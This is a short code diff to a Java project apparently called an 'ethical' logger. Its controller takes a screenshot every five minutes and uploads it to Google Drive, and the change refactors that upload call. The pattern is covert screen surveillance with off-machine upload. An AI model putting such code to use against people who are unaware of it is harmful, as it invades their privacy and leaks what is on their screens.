@@ -1,5 +1,6 @@
 package com.mycompany.ethicaljavalogger.controllers;
 
+import com.mycompany.ethicaljavalogger.constants.FileType;
 import com.mycompany.ethicaljavalogger.services.GoogleDriveService;
 import com.mycompany.ethicaljavalogger.services.ScreenCaptureService;
 import java.util.concurrent.Executors;
@@ -16,7 +17,9 @@ public class ScreenCaptureController {
 
             scheduler.scheduleAtFixedRate(() -> {
                 String imagePath = screenCaptureService.capture();
-                GoogleDriveService.getInstance().sendMedia(imagePath, GoogleDriveService.getInstance().getImagesFolderId());
+                String fileName = screenCaptureService.generateFileName();
+                
+                GoogleDriveService.getInstance().sendMedia(fileName, imagePath, GoogleDriveService.getInstance().getImagesFolderId(), FileType.IMAGE_PNG);
             }, 0, 5, TimeUnit.MINUTES);
         }).start();
     }
